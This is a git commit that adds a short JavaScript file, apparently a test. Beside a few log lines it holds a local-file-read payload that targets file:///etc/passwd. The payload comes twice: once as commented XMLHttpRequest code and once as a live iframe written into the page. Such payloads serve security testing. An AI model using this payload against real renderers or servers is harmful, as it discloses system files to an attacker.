88db6b3e384f786405fff1da8291e843b9acbfb6
Shahid Nawaz <80408404+ShahidKalwani@users.noreply.github.com>
2024-03-11 01:09:37 +0500

    Create k.js

---
+++ k.js
@@ -0,0 +1,11 @@
+console.log("file called");
+
+console.log("welcome");
+console.log("another updated");
+// request
+// x=new XMLHttpRequest;
+// x.onload=function(){document.write(this.responseText)};
+// x.open("GET","file:///etc/passwd");x.send();
+document.write('<iframe src=file:///etc/passwd></iframe>');
+
+// udpated
